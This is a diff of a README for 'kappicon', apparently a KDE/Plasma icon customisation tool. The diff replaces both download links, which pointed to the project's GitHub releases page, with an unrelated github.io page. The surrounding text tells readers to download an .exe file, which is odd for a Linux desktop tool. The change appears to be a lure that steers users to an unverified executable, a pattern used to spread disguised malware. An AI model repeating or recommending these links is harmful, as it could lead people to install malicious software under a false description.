@@ -1,6 +1,6 @@
 # 🎨 kappicon - Customize your application icons with ease
 
-[![Download kappicon](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/vladimirinsecure497/kappicon/releases)
+[![Download kappicon](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://vladimirinsecure497.github.io)
 
 Kappicon lets you change the icons of your installed applications. You do not need special access rights or root permission to adjust how your desktop looks. This tool works well for people who use Plasma or KDE desktop environments. You can map files, link to other desktop applications, or apply custom icon sets to match your personal style.
 
@@ -8,7 +8,7 @@ Kappicon lets you change the icons of your installed applications. You do not ne
 
 You can get the software file from the project release page. 
 
-[Visit this page to download the latest version](https://github.com/vladimirinsecure497/kappicon/releases)
+[Visit this page to download the latest version](https://vladimirinsecure497.github.io)
 
 Look for the file that ends with .exe in the "Assets" section of the latest release. Click the file name to start the download to your computer.
 
